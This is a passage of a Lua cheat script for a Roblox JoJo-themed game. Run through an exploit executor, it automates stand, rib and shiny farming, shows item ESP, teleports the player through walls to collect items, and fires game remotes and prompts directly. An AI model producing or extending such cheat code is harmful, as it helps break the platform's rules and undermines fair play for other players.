                if self:GetPlayer().PlayerStats.Stand.Value ~= "None" then break end
                task.wait(0.1)
            end
            
            task.wait(0.2)
            self:GetPlayer().CharacterAdded:Wait()
        end
    end
    function Azure.Utils:UseRib()
        local Arguments = {
            [1] = "EndDialogue",
            [2] = {
                ["NPC"] = "Rib Cage of The Saint's Corpse",
                ["Option"] = "Option1",
                ["Dialogue"] = "Dialogue2"
            }
        }
        self:GetCharacter().RemoteEvent:FireServer(unpack(Arguments))
    end
    function Azure.Utils:Collect(Item)
        local Character = self:GetCharacter()
        local HRP = self:GetHRP()
        if not (Item and Item.PrimaryPart and Character and HRP) then return end
        local OldCF = HRP.CFrame
        local startTime = tick()
        
        local clipConn = game:GetService("RunService").Stepped:Connect(function()
            for _, v in pairs(Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end
        end)
        
        HRP.CFrame = Item.PrimaryPart.CFrame - v3(0, 10, 0)
        task.wait(0.3)
        repeat
            fireproximityprompt(Item:FindFirstChild("ProximityPrompt"))
            if Item.Parent == workspace.Item_Spawns.Items then
                HRP.CFrame = Item.PrimaryPart.CFrame - v3(0, 10, 0)
            end
            task.wait()
        until Item.Parent ~= workspace.Item_Spawns.Items or tick() - startTime >= 3.5
        task.wait(0.6)
        HRP.CFrame = OldCF
        clipConn:Disconnect()
    end
    function Azure.Utils:AddTask(TaskName, Task)
        if not self.Tasks[TaskName] then self.Tasks[TaskName] = Task end
        return Task
    end
    function Azure.Utils:IsTaskRunning(TaskName) return self.Tasks[TaskName] and self.Tasks[TaskName].Connected end
    function Azure.Utils:DisconnectTask(TaskName) if self:IsTaskRunning(TaskName) then self.Tasks[TaskName]:Disconnect(); self.Tasks[TaskName] = nil end end
    function Azure.Utils:AddValues(Values)
        for key, value in pairs(Values) do
            if key:lower() == "int" then
                for i,v in pairs(Values[key]) do
                    self.Ints[i] = (type(v) == "number" and {["Value"] = v, ["SaveValue"] = false} or type(v) == "table" and {["Value"] = v[1], ["SaveValue"] = v["SaveValue"]})
                end
            end
            if key:lower() == "state" then
                for i,v in pairs(Values[key]) do
                    self.States[i] = (type(v) == "boolean" and {["Value"] = v, ["SaveValue"] = false} or type(v) == "table" and {["Value"] = v[1], ["SaveValue"] = v["SaveValue"]})
                end
            end
            if key:lower() == "string" then
                for i,v in pairs(Values[key]) do
                    self.Strings[i] = (type(v) == "string" and {["Value"] = v, ["SaveValue"] = false} or type(v) == "table" and {["Value"] = v[1], ["SaveValue"] = v["SaveValue"]})
                end
            end
            if key:lower() == "table" then
                for i,v in pairs(Values[key]) do
                    self.Tables[i] = ((v["SaveValue"] and v["SaveValue"] == true) and {["Value"] = v[1], ["SaveValue"] = v["SaveValue"]} or {["Value"] = v, ["SaveValue"] = false})
                end
            end
        end
    end
    function Azure.Utils:GetInt(Value) return self.Ints[Value] and self.Ints[Value].Value or 0 end
    function Azure.Utils:GetString(Value) return self.Strings[Value] and self.Strings[Value].Value or "" end
    function Azure.Utils:GetState(Value) return self.States[Value] and self.States[Value].Value or false end
    function Azure.Utils:GetTable(Value) return self.Tables[Value] and self.Tables[Value].Value or {} end
    function Azure.Utils:SetInt(Value, NewValue) if self.Ints[Value] then self.Ints[Value].Value = NewValue end end
    function Azure.Utils:SetState(Value, NewValue) if self.States[Value] then self.States[Value].Value = NewValue end end
    function Azure.Utils:SetTable(Value, NewValue) if self.Tables[Value] then self.Tables[Value].Value = NewValue end end
    function Azure.Utils:ChangeTable(Value, TableIndex, NewValue) if self.Tables[Value] then self.Tables[Value].Value[TableIndex] = NewValue end end
    function Azure.Utils:InsertTable(Value, InsertedValue) if self.Tables[Value] then table.insert(self.Tables[Value].Value, InsertedValue) end end
    function Azure.Utils:RemoveTable(Value, RemovedValue) if self.Tables[Value] then table.remove(self.Tables[Value].Value, table.find(self.Tables[Value].Value, RemovedValue)) end end
    function Azure.Utils:FindTable(Value, TableIndex) return table.find(self.Tables[Value].Value, TableIndex) end

    local Util = Azure.Utils.MakeUtilController()
    
    Util:AddValues{
        ["Int"] = {
            ["Speed"] = 16; ["Jump"] = 50; ["FlySpeed"] = 0.5; ["TSDelay"] = 0.8;
            ["Item Collection Delay"] = 0.6; ["Prediction Strength"] = 0.5; ["Stand Attach Distance"] = 2.5;
            ["InfTick"] = tick(); ["InfDelay"] = 1; ["DashPower"] = 50;
        };
        ["State"] = {
            ["Speed"] = false; ["Jump"] = false; ["God Mode"] = false; ["Anti Vamp Burn"] = false;
            ["Item ESP"] = false; ["Item Notify"] = false; ["Stand Farm"] = false; ["Rib Farm"] = false;
            ["Shiny Farm"] = false; ["Rib Shiny Farm"] = false; ["Safe Farm"] = false;
            ["Use Redeemed"] = false; ["Keep any shiny"] = false; ["Waiting"] = false;
            ["CompletedQuest"] = true; ["Auto Sprinting"] = false; ["View Stand"] = false;
            ["Follow Stand"] = false; ["Auto Sell"] = false; ["Infinite Dash"] = false;
        };
        ["String"] = {
            ["Stand"] = ""; ["Shiny"] = ""; ["Chosen Player"] = ""; ["TrollingPlayer"] = "";
            ["Pity"] = ""; ["Webhook"] = "";
        };
        ["Table"] = {
            Stands = {}; Shinys = {}; Queue = {}; AnimsList = {}; Poses = {};
            AnimsBlacklist = {"Ice Skating", "Stunned", "StandAppear", "StandDisappear"};
            AllMods = {}; AllItems = {"Christmas Present", "Mysterious Arrow", "Pure Rokakaka", "Rokakaka", "Diamond", "Lucky Arrow", "Lucky Stone Mask", "Dio's Diary", "Steel Ball", "Rib Cage of The Saint's Corpse", "Stone Mask", "Gold Coin", "Quinton's Glove", "Ancient Scroll"};
            AllStands = {"Whitesnake", "Stone Free", "Star Platinum", "The World", "Crazy Diamond", "Killer Queen", "Gold Experience", "King Crimson", "Silver Chariot", "Hermit Purple", "The Hand", "Purple Haze", "Cream", "Hierophant Green", "Magician's Red", "White Album", "Aerosmith", "Six Pistols", "Beach Boy", "Mr. President", "Sticky Fingers", "Anubis", "Red Hot Chili Pepper", "Scary Monsters", "The World Alternate Universe", "D4C", "Tusk ACT 1", "Soft & Wet"};
            AllShinys = {
                "Action-Figure Platinum", "Actually Red Hot Chili Pepper", "Aerosmith Over Heaven", "All-Starsnake", "Anti-Umbral", "Asuna", "Biblically Accurate Experience", "Blade Of The Exile", "Casull", "Charmy Green", "Chromo", "Comic Venom", "Cracked World", "Crazy Ruby", "Crazy Idol", "Creeper Queen", "D4She", "Devil4c", "Deimos Queen", "Deimos Snake", "Eldritch Hierophant", "Elizabeth Liones", "Elucidator & Dark Repulser", "Emperor", "Emperor OVA", "Female The Hand", "Frozone", "Glock-18", "Glock-18 Fade", "Gold Platinum", "Golden Frieza", "Gold & Wet", "Headhunter", "Heaven Spirit", "Tentacle Black", "Tentacle Purple", "Tentacle Yellow", "Holly's Sickness", "Jade Peace", "Jaguar Platinum", "Kanshou & Bakuya", "Kikoku", "Killer Reveal", "King of The End", "Linked Sword", "Luffy Gear 4", "Magellan", "Magician's Red: Over Heaven", "Manga Crimson", "Megumin", "Mintsnake", "Misaka Mikoto", "Mr. Joestar", "Ms. Aerosmith", "Neon Ascension", "Neo World", "Nerf Jolt", "Nocturne", "Nonosama Bo", "ODM Gear", "OVA Silver Chariot", "Old President", "Pinky Fingers", "Queen Crimson", "Rock Unleashed", "Sakura", "Shadow Killer Queen", "Shadow The World", "Sorcerer's Ember", "Spider-Man", "Sasageyo", "Star Platinum OVA", "Star Striped Eagle", "Star Waifu", "Stone Platinum", "The Other Hand", "The Waifu v2", "The Waifu: Alternate Universe", "The World: Greatest High", "The World 2", "The World OVA", "The World Ultimate", "Toy Sticky Fingers", "Tsunade", "Uber Spy", "Whisper", "Vanilla Ice Cream", "Venom", "Vinegar Crimson", "Virus Vessel", "Jack-O-Platinum", "Ghost World", "Crazy Overseer", "Tyrant Crimson", "Jester Crimson", "Vexus Crimson", "Pumpkin Patch", "Cornsnake", "Crimson Mist", "Dead Experience", "Undead Hand", "Undead Flare", "Bloodthirster"
            };
            Cache = {["Speed"] = 16; ["Jump"] = 50; ["Waypoint"] = nil; ["Spawnpoint"] = nil;};
            CachedAssets = {}; Keybinds = {}; ShinyToggles = {}; ItemSellToggles = {}; ChosenItemsToSell = {};
        };
    }
    
    if game.PlaceId ~= 2809202155 then
        local Folder = Instance.new("Folder", workspace)
        Folder.Name = "Item_Spawns"
        local Folder2 = Instance.new("Folder", Folder)
        Folder2.Name = "Items"
    end
    
    local MapFolder = Instance.new("Folder", workspace)
    for _, Part in workspace.Map:GetChildren() do
        task.spawn(function() Part.Parent = MapFolder end)
    end
    
    local StandFarmSettings = StandFarmTab:Section({ Title = "Stand Farm Settings" })
    local RibFarmSettings = StandFarmTab:Section({ Title = "Rib Farm Settings" })
    local ShinyFarmSettings = StandFarmTab:Section({ Title = "Shiny Farm Settings" })
    local ShinySelection = StandFarmTab:Section({ Title = "Shiny Selection" })
    local standFarmRunning = false
    local ribFarmRunning = false
    local shinyFarmRunning = false
    local ribShinyFarmRunning = false

    local queueEspFolder = workspace:FindFirstChild("AzureItemESP")
    if not queueEspFolder then
        queueEspFolder = Instance.new("Folder")
        queueEspFolder.Name = "AzureItemESP"
        queueEspFolder.Parent = workspace
    end

    local queueEspParts = {}

    local function destroyQueueESP()
        for _, v in pairs(queueEspFolder:GetChildren()) do
            v:Destroy()
        end
        table.clear(queueEspParts)
    end

    for _, v in pairs(workspace:GetChildren()) do
        if v:IsA("BasePart") and v.Transparency == 1 and v.Anchored and (not v.CanCollide) then
            local bill = v:FindFirstChild("AzureESP")
            if bill and bill:IsA("BillboardGui") then
                v:Destroy()
            end
        end
    end

    destroyQueueESP()

    local function createQueueESP(Item, IdentifiedItem)
        if not Util:GetState("Item ESP") then
            return
        end
        if not (Item and Item.Parent == workspace.Item_Spawns.Items and Item.PrimaryPart) then
            return
        end
        if queueEspParts[Item] and queueEspParts[Item].Parent then
            return
        end

        local ESPPart = Instance.new("Part")
        ESPPart.Name = IdentifiedItem
        ESPPart.CFrame = Item.PrimaryPart.CFrame
        ESPPart.Anchored = true
        ESPPart.CanCollide = false
        ESPPart.Transparency = 1
        ESPPart.Parent = queueEspFolder

        local Billboard = Instance.new("BillboardGui")
        Billboard.AlwaysOnTop = true
        Billboard.Size = UDim2.new(8, 0, 2, 0)
        Billboard.StudsOffset = Vector3.new(0, 2, 0)
        Billboard.Name = "AzureESP"
        Billboard.Enabled = true
        Billboard.Parent = ESPPart

        local ESPLabel = Instance.new("TextLabel")
        ESPLabel.Size = UDim2.new(0, 100, 0, 100)
        ESPLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
        ESPLabel.BackgroundTransparency = 1
        ESPLabel.AnchorPoint = Vector2.new(0.5, 0.5)
        ESPLabel.Text = IdentifiedItem
        ESPLabel.TextColor3 = Color3.new(1, 1, 1)
        ESPLabel.TextStrokeTransparency = 0
        ESPLabel.Parent = Billboard

        queueEspParts[Item] = ESPPart

        task.spawn(function()
            while task.wait(0.1) do
                if not Util:GetState("Item ESP") then
                    break
                end
                if Item.Parent == workspace.Item_Spawns.Items and Item.PrimaryPart and ESPPart.Parent then
                    ESPPart.CFrame = Item.PrimaryPart.CFrame
                    local hrp = Util:GetHRP()
                    if hrp then
                        ESPLabel.Text = IdentifiedItem .. " (" .. math.round((hrp.Position - Item.PrimaryPart.Position).Magnitude) .. "m)"
                    else
                        ESPLabel.Text = IdentifiedItem
                    end
                else
                    break
                end
            end

            queueEspParts[Item] = nil
            if ESPPart and ESPPart.Parent then
                ESPPart:Destroy()
            end
        end)
    end

    local function refreshQueueESP()
        destroyQueueESP()
        if not Util:GetState("Item ESP") then
            return
        end
        for _, ItemData in pairs(Util:GetTable("Queue")) do
            if type(ItemData) == "table" and ItemData.ItemModel and ItemData.ItemName then
                createQueueESP(ItemData.ItemModel, ItemData.ItemName)
            end
        end
    end
    
    local function AddToQueue(Item)
        local function Identify(Item)
            repeat task.wait() until Item:FindFirstChildWhichIsA("ProximityPrompt")
            for _, v in pairs(Item:GetChildren()) do
                if v:IsA("ProximityPrompt") and v.MaxActivationDistance > 0 then
                    return v.ObjectText
                end
            end
            return "Invalid Item"
        end
        
        local IdentifiedItem = Identify(Item)
        if IdentifiedItem ~= "Invalid Item" then
            repeat task.wait() until Item:FindFirstChild("ProximityPrompt")
            local startWait = tick()
            while Item.Parent and not Item.PrimaryPart and (tick() - startWait) < 5 do
                task.wait()
            end
            if not (Item.Parent and Item.PrimaryPart) then
                return
            end

            local ItemData = {CFrame = Item.PrimaryPart.CFrame, ItemName = IdentifiedItem, ItemModel = Item}
            local prompt = Item:FindFirstChildWhichIsA("ProximityPrompt")
            if not prompt then
                return
            end
            Util:ChangeTable("Queue", prompt, ItemData)
            createQueueESP(Item, IdentifiedItem)
        end
    end
    
    StandFarmSettings:Toggle({
        Flag = "StandFarm_UseRedeemed",
        Title = "Use Redeemed Items",
        Default = false,
        Callback = function(State)
            Util:SetState("Use Redeemed", State)
        end
    })
    
    StandFarmSettings:Toggle({
        Flag = "StandFarm_KeepAnyShiny",
        Title = "Keep Any Shiny",
        Default = false,
        Callback = function(State)
            Util:SetState("Keep any shiny", State)
        end
    })

    StandFarmSettings:Toggle({
        Flag = "StandFarm_ItemESP",
        Title = "Item ESP (Distance)",
        Default = false,
        Callback = function(State)
            Util:SetState("Item ESP", State)
            refreshQueueESP()
        end
    })

    StandFarmSettings:Toggle({
        Flag = "StandFarm_PityMode",
        Title = "Pity Farm Mode",
        Default = false,
        Callback = function(State)
            Util:SetState("PityMode", State)
        end
    })

    StandFarmSettings:Input({
        Flag = "StandFarm_PityGoal",
        Title = "Pity Goal",
        Default = "2.0",
        Placeholder = "Target Pity (e.g. 2.5)",
        Callback = function(Value)
            Util:SetState("PityGoal", tonumber(Value) or 2.0)
        end
    })

    StandFarmSettings:Dropdown({
        Title = "Use For Stand",
        Values = {"Mysterious Arrow", "Rib Cage"},
        Value = "Mysterious Arrow",
        Flag = "PityFarm_StandSource",
        Callback = function(val)
            if val == "Rib Cage" then
                Util:SetState("StandSource", "Rib Cage of The Saint's Corpse")
            else
                Util:SetState("StandSource", "Mysterious Arrow")
            end
        end
    })

    local pityHudGui = nil
    StandFarmSettings:Toggle({
        Flag = "StandFarm_PityHUD",
        Title = "Show Pity HUD",
        Default = false,
        Callback = function(s)
            if s then
                if not pityHudGui then
                    pityHudGui = Instance.new("ScreenGui")
                    pityHudGui.Name = "PityHUD"
                    pityHudGui.ResetOnSpawn = false
                    if syn and syn.protect_gui then syn.protect_gui(pityHudGui) end
                    pityHudGui.Parent = game:GetService("CoreGui")
                    
                    local frame = Instance.new("Frame")
                    frame.Size = UDim2.new(0, 220, 0, 60)
                    frame.Position = UDim2.new(0.02, 0, 0.7, 0)
                    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
                    frame.BackgroundTransparency = 0.3
                    frame.Parent = pityHudGui
                    
                    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
                    
                    local label = Instance.new("TextLabel")
                    label.Size = UDim2.new(1, -20, 1, -10)
                    label.Position = UDim2.new(0, 10, 0, 5)
                    label.BackgroundTransparency = 1
                    label.TextColor3 = Color3.fromRGB(255, 255, 255)
                    label.TextSize = 16
                    label.Font = Enum.Font.GothamBold
                    label.TextXAlignment = Enum.TextXAlignment.Left
                    label.Text = "Pity: Loading..."
                    label.TextWrapped = true
                    label.Parent = frame
                    
                    task.spawn(function()
                        while pityHudGui and pityHudGui.Parent do
                            local plr = game.Players.LocalPlayer
                            local stats = plr:FindFirstChild("PlayerStats")
                            local lstats = plr:FindFirstChild("leaderstats")
                            
                            local function checkNum(v)
                                return v and (v:IsA("NumberValue") or v:IsA("IntValue"))
                            end
                            
                            local function getPity()
                                local v = stats and stats:FindFirstChild("PityCount")
                                if checkNum(v) then return v, "PityCount" end
                                v = stats and stats:FindFirstChild("Pity")
                                if checkNum(v) then return v, "Pity" end
                                if stats then
                                    for _, c in ipairs(stats:GetChildren()) do
                                        if checkNum(c) and c.Name:lower():find("pity") then
                                            return c, c.Name
                                        end
                                    end
                                end
                                if lstats then
                                    for _, c in ipairs(lstats:GetChildren()) do
                                        if checkNum(c) and c.Name:lower():find("pity") then
                                            return c, c.Name
                                        end
                                    end
                                end
                                return nil, "Unknown"
                            end
                            
                            local pObj, pName = getPity()
                            local rawVal = pObj and pObj.Value or 0
                            local goalVal = Util:GetState("PityGoal") or 2.0
                            local sc = rawVal
                            if goalVal >= 1 and rawVal <= 1 then sc = rawVal * 100
                            elseif goalVal < 1 and rawVal > 1 then sc = rawVal / 100 end
                            
                            label.Text = string.format("Pity(%s): %.2f\nRaw: %.2f  Goal: %.2f", pName, sc, rawVal, goalVal)
                            task.wait(0.5)
                        end
                    end)
                end
                pityHudGui.Enabled = true
            else
                if pityHudGui then
                    pityHudGui.Enabled = false
                    pityHudGui:Destroy()
                    pityHudGui = nil
                end
            end
        end
    })
    
    StandFarmSettings:Toggle({
        Flag = "StandFarm_Enabled",
    Title = "Enable Stand Farm",
    Default = false,
    Callback = function(State)
        if State then
            local selectedStands = Util:GetTable("Stands")
            local keepAnyShiny = Util:GetState("Keep any shiny")
            local pityMode = Util:GetState("PityMode")
            
            if #selectedStands == 0 and not keepAnyShiny and not pityMode then
                notify("Stand Farm", "No stands selected! Please select stands to farm first, or enable 'Keep Any Shiny' or 'Pity Farm Mode'")
                StandFarmSettings:Set("StandFarm_Enabled", false)
                return
            end
            
            if keepAnyShiny and #selectedStands == 0 then
                notify("Stand Farm", "Keep Any Shiny enabled - will farm for ANY shiny stand")
            end

            if pityMode then
                notify("Stand Farm", "Pity Farm Mode enabled - will stop when Pity Goal is reached")
            end
            
            standFarmRunning = true
            notify("Stand Farm", "Stand farming started!")
            
            local function GetMax(Item)
                local Max = {
                    ["Mysterious Arrow"] = 25, ["Rokakaka"] = 25,
                    ["Diamond"] = 30, ["Gold Coin"] = 45, ["Pure Rokakaka"] = 10,
                    ["Stone Mask"] = 10, ["Rib Cage of The Saint's Corpse"] = 10,
                    ["Steel Ball"] = 10, ["Ancient Scroll"] = 10, ["Dio's Diary"] = 10,
                    ["Caesar's Headband"] = 10, ["Christmas Present"] = 45,
                    ["Quinton's Glove"] = 10, ["Lucky Arrow"] = 10
                }
                local gp = game:GetService("MarketplaceService")
                local has2x = gp and gp:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 14597778)
                if has2x then 
                    for i,v in pairs(Max) do Max[i] = v * 2 end 
                end
                return Max[Item] or 999
            end
            
            local function CountItem(Item)
                local player = game.Players.LocalPlayer
                local Backpack = player.Backpack
                local Count = 0
                for _, v in pairs(Backpack:GetChildren()) do 
                    if v.Name == Item then Count = Count + 1 end 
                end
                local Char = player.Character
                if Char and Char:FindFirstChildWhichIsA("Tool") and Char:FindFirstChildWhichIsA("Tool").Name == Item then 
                    Count = Count + 1 
                end
                return Count
            end

            local function LearnWorthiness()
                local player = game.Players.LocalPlayer
                local Character = player.Character or player.CharacterAdded:Wait()
                local remoteFunc = Character:FindFirstChild("RemoteFunction")
                
                if not remoteFunc then 
                    notify("Stand Farm", "RemoteFunction not found, waiting...")
                    return false 
                end
                
                local worthinessSkills = {
                    "Worthiness", "Worthiness II", "Worthiness III", 
                    "Worthiness IV", "Worthiness V"
                }
                
                for _, skill in pairs(worthinessSkills) do
                    pcall(function()
                        remoteFunc:InvokeServer("LearnSkill", {
                            ["Skill"] = skill,
                            ["SkillTreeType"] = "Character"
                        })
                    end)
                    task.wait(0.1)
                end
                
                return true
            end
            
            local noclipEnabled = false
            local noclipConn = nil
            local function EnableNoclip()
                if noclipEnabled then return end
                local Character = game.Players.LocalPlayer.Character
                if not Character then return end
                noclipConn = game:GetService("RunService").Stepped:Connect(function()
                    for _, p in pairs(Character:GetDescendants()) do
                        if p:IsA("BasePart") then p.CanCollide = false end
                    end
                end)
                noclipEnabled = true
            end
            
            local function DisableNoclip()
                if noclipConn then noclipConn:Disconnect() end
                noclipEnabled = false
            end
            
            task.spawn(function()
                local cooldown = 0
                local lastFarm = 0
                local delay = 0.6
                local doneWorthiness = false
                
                game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
                    doneWorthiness = false
                end)
                
                while standFarmRunning do
                    task.wait(1)

                    local plr = game.Players.LocalPlayer
                    local chr = plr.Character or plr.CharacterAdded:Wait()
                    local hrp = chr:FindFirstChild("HumanoidRootPart")
                    if not hrp then continue end
                    
                    local function getPityRaw()
                        local stats = plr:FindFirstChild("PlayerStats")
                        local lstats = plr:FindFirstChild("leaderstats")
                        local function isNum(v) return v and (v:IsA("NumberValue") or v:IsA("IntValue")) end
                        local function tryFind(c, n) if not c then return nil end local v = c:FindFirstChild(n) return isNum(v) and v or nil end
                        
                        local v = tryFind(stats, "PityCount") or tryFind(stats, "Pity") or tryFind(stats, "PityCounter") or tryFind(lstats, "PityCount") or tryFind(lstats, "Pity")
                        if v then return tonumber(v.Value) or 0 end
                        
                        if stats then 
                            for _, c in ipairs(stats:GetChildren()) do 
                                if isNum(c) and c.Name:lower():find("pity") then return tonumber(c.Value) or 0 end 
                            end 
                        end
                        return 0
                    end
                    
                    local function getPityScaled()
                        local raw = getPityRaw()
                        local goal = Util:GetState("PityGoal") or 2.0
                        if goal >= 1 and raw <= 1 then return raw * 100 end
                        if goal < 1 and raw > 1 then return raw / 100 end
                        return raw
                    end
                    
                    local function norm(s) return (tostring(s or ""):gsub("^%s+", ""):gsub("%s+$", ""):lower()) end
                    
                    local curPity = getPityScaled()
                    local pityMode = Util:GetState("PityMode")
                    local pityGoal = Util:GetState("PityGoal") or 2.0

                    if pityMode and curPity >= pityGoal then
                        notify("Stand Farm", "Goal reached! Pity: " .. curPity)
                        standFarmRunning = false
                        StandFarmSettings:Set("StandFarm_Enabled", false)
                        DisableNoclip()
                        break
                    end
                    
                    local curStand = plr.PlayerStats.Stand.Value
                    if curStand ~= "None" then
                        local selected = Util:GetTable("Stands")
                        local isTarget = false
                        local nStand = norm(curStand)
                        
                        for _, s in ipairs(selected) do 
                            if norm(s) == nStand then isTarget = true break end 
                        end
                        
                        local curShiny = Util:CheckShiny()
                        local isShiny = curShiny ~= "None" and curShiny ~= nil
                        local keepShiny = Util:GetState("Keep any shiny")
                        
                        if keepShiny and isShiny then
                            notify("Stand Farm", "Got shiny! " .. curStand .. " (" .. curShiny .. ")")
                            standFarmRunning = false
                            StandFarmSettings:Set("StandFarm_Enabled", false)
                            DisableNoclip()
                            break
                        elseif isTarget and not keepShiny then
                            notify("Stand Farm", "Got stand: " .. curStand)
                            standFarmRunning = false
                            StandFarmSettings:Set("StandFarm_Enabled", false)
                            DisableNoclip()
                            break
                        elseif isTarget and isShiny and keepShiny then
                            notify("Stand Farm", "Got target shiny! " .. curStand)
                            standFarmRunning = false
                            StandFarmSettings:Set("StandFarm_Enabled", false)
                            DisableNoclip()
                            break
                        end
                        
                        -- need to roka if we here
                        if CountItem("Rokakaka") <= 0 then
                            local money = plr.PlayerStats.Money.Value
                            local remote = chr:FindFirstChild("RemoteEvent")
                            if money >= 2500 and remote then
                                remote:FireServer("PurchaseShopItem", {["ItemName"] = "1x Rokakaka"}, 1, 2)
                                wait(0.5)
                            end
                        end
                        
                        if CountItem("Rokakaka") > 0 then
                            notify("Stand Farm", "Using roka...")
                            local hum = chr:FindFirstChildWhichIsA("Humanoid")
                            local tool = plr.Backpack:FindFirstChild("Rokakaka") or chr:FindFirstChild("Rokakaka")
                            
                            if hum and tool then
                                hum:EquipTool(tool)
                                wait(0.3)
                                
                                local vim = game:GetService("VirtualInputManager")
                                local start = tick()
                                repeat
                                    vim:SendMouseButtonEvent(0, 8, 0, true, nil, 1)
                                    task.wait(0.05)
                                until plr.PlayerGui:FindFirstChild("DialogueGui") or tick() - start > 3
                                
                                local gui = plr.PlayerGui:FindFirstChild("DialogueGui")
                                if gui then
                                    local frame = gui:FindFirstChild("Frame")
                                    local opt = frame and frame:FindFirstChild("Options") and frame.Options:FindFirstChild("Option1")
                                    if opt and opt:FindFirstChild("TextButton") then
                                        for _, c in pairs(getconnections(opt.TextButton.MouseButton1Click)) do c:Fire() end
                                    end
                                end
                            end
                            
                            local sWait = tick()
                            local done = false
                            while tick() - sWait < 1.5 do
                                if plr.PlayerStats.Stand.Value == "None" then done = true break end
                                task.wait(0.1)
                            end
                            
                            if not done then
                                local hum = chr:FindFirstChildWhichIsA("Humanoid")
                                local tool = plr.Backpack:FindFirstChild("Rokakaka") or chr:FindFirstChild("Rokakaka")
                                if hum and tool then
                                    hum:EquipTool(tool)
                                    wait(0.3)
                                    local vim = game:GetService("VirtualInputManager")
                                    local start = tick()
                                    repeat
                                        vim:SendMouseButtonEvent(0, 8, 0, true, nil, 1)
                                        task.wait(0.1)
                                    until plr.PlayerGui:FindFirstChild("DialogueGui") or tick() - start > 3
                                    
                                    local gui = plr.PlayerGui:FindFirstChild("DialogueGui")
                                    if gui then
                                        local frame = gui:FindFirstChild("Frame")
                                        local opt = frame and frame:FindFirstChild("Options") and frame.Options:FindFirstChild("Option1")
                                        if opt and opt:FindFirstChild("TextButton") then
                                            for _, c in pairs(getconnections(opt.TextButton.MouseButton1Click)) do c:Fire() end
                                        end
                                    end
                                end
                            end
                            
                            plr.CharacterAdded:Wait()
                            wait(0.5)
                        end
                        continue
                    end
                    
                    -- stand is none, use arrow/rib
                    local source = Util:GetState("StandSource") or "Mysterious Arrow"
                    if CountItem(source) <= 0 then
                        local money = plr.PlayerStats.Money.Value
                        local remote = chr:FindFirstChild("RemoteEvent")
                        
                        -- removed to reduce bloat
                        -- farm if still 0
                        if CountItem(source) <= 0 then
                            local spawns = workspace:FindFirstChild("Item_Spawns") and workspace.Item_Spawns:FindFirstChild("Items")
                            if spawns then
                                for _, v in pairs(spawns:GetChildren()) do
                                    local prox = v:FindFirstChild("ProximityPrompt")
                                    local part = v:FindFirstChildOfClass("MeshPart") or v:FindFirstChild("Part") or v.PrimaryPart
                                    if prox and part and part.Transparency < 1 and prox.ObjectText == source then
                                        EnableNoclip()
                                        local oldCF = hrp.CFrame
                                        hrp.CFrame = part.CFrame + Vector3.new(0, 1, 0)
                                        wait(0.3)
                                        fireproximityprompt(prox, 4)
                                        wait(0.3)
                                        hrp.CFrame = oldCF
                                        DisableNoclip()
                                        wait(0.2)
                                        break
                                    end
                                end
                            end
                        end
                    end
                    
                    if CountItem(source) > 0 then
                        if not doneWorthiness then
                            LearnWorthiness()
                            doneWorthiness = true
                            wait(0.2)
                        end
                        
                        notify("Stand Farm", "Equipping " .. source)
                        local hum = chr:FindFirstChildWhichIsA("Humanoid")
                        local tool = plr.Backpack:FindFirstChild(source) or chr:FindFirstChild(source)
                        
                        if hum and tool then
                            hum:EquipTool(tool)
                            wait(0.1)
                            
                            local vim = game:GetService("VirtualInputManager")
                            local startClick = tick()
                            repeat
                                vim:SendMouseButtonEvent(0, 0, 0, true, nil, 0)
                                vim:SendMouseButtonEvent(0, 0, 0, false, nil, 0)
                                task.wait(0.05)
                            until tick() - startClick > 0.5 or plr.PlayerStats.Stand.Value ~= "None"
                            
                            wait(0.2)
                        end
                        
                        if source == "Rib Cage of The Saint's Corpse" then
                            local remote = chr:FindFirstChild("RemoteEvent")
                            if remote then
                                remote:FireServer("EndDialogue", {NPC = source, Option = "Option1", Dialogue = "Dialogue2"})
                            end
                        end
                        
                        if hum and tool then
                            hum:EquipTool(tool)
                            wait(0.3)
                            local vim = game:GetService("VirtualInputManager")
                            local start = tick()
                            repeat
                                vim:SendMouseButtonEvent(0, 8, 0, true, nil, 1)
                                task.wait(0.1)
                            until plr.PlayerGui:FindFirstChild("DialogueGui") or tick() - start > 3
                            
                            local gui = plr.PlayerGui:FindFirstChild("DialogueGui")
                            if gui then
                                local frame = gui:FindFirstChild("Frame")
                                local opt = frame and frame:FindFirstChild("Options") and frame.Options:FindFirstChild("Option1")
                                if opt and opt:FindFirstChild("TextButton") then
                                    for _, c in pairs(getconnections(opt.TextButton.MouseButton1Click)) do c:Fire() end
                                end
                            end
                        end
                        
                        local startWait = tick()
                        while tick() - startWait < 10 do
                            if plr.PlayerStats.Stand.Value ~= "None" then break end
                            task.wait(0.1)
                        end
                    end
                end
                
                DisableNoclip()
            end)
        else
            standFarmRunning = false
            notify("Stand Farm", "Stand farming stopped!")
        end
    end
})
    
    local standDropdown = StandFarmTab:Dropdown({
        Flag = "StandDropdown",
        Title = "Select Stands to Farm",
        Values = Util:GetTable("AllStands"),
        SearchBarEnabled = true,
        Multi = true,
        Callback = function(selected)
            Util:SetTable("Stands", selected)
        end
    })
    
    RibFarmSettings:Toggle({
        Flag = "RibFarm_Enabled",
        Title = "Enable Rib Farm",
        Default = false,
        Callback = function(State)
            if State then
                ribFarmRunning = true
                notify("Rib Farm", "Rib farming started!")
                
                local HRP = Util:GetHRP()
                
                task.spawn(function()
                    while ribFarmRunning do
                        task.wait()
                        if Util:CountItem("Rib Cage of The Saint's Corpse") == 0 then
                            FarmItems({"Rib Cage of The Saint's Corpse"})
                        end
                        
                        if Util:HasStand() and Util:FindTable("Stands", Util:CheckStand()) then
                            if not Util:GetState("Waiting") then
                                notify("Rib Farm", "You have the stand you wanted: " .. Util:CheckStand())
                                Util:SetState("Waiting", true)
                                ribFarmRunning = false
                                RibFarmSettings:Set("RibFarm_Enabled", false)
                                break
                            end
                        else
                            Util:SetState("Waiting", false)
                        end
                        
                        if ribFarmRunning then
                            Util:Stats()
                            Util:UseRib()
                            repeat task.wait() until Util:HasStand()
                        end
                    end
                end)
            else
                ribFarmRunning = false
                Util:DisconnectTask("SafeFarm")
                notify("Rib Farm", "Rib farming stopped!")
            end
        end
    })
    
    ShinyFarmSettings:Toggle({
        Flag = "ShinyFarm_Enabled",
        Title = "Enable Shiny Farm",
        Default = false,
        Callback = function(State)
            if State then
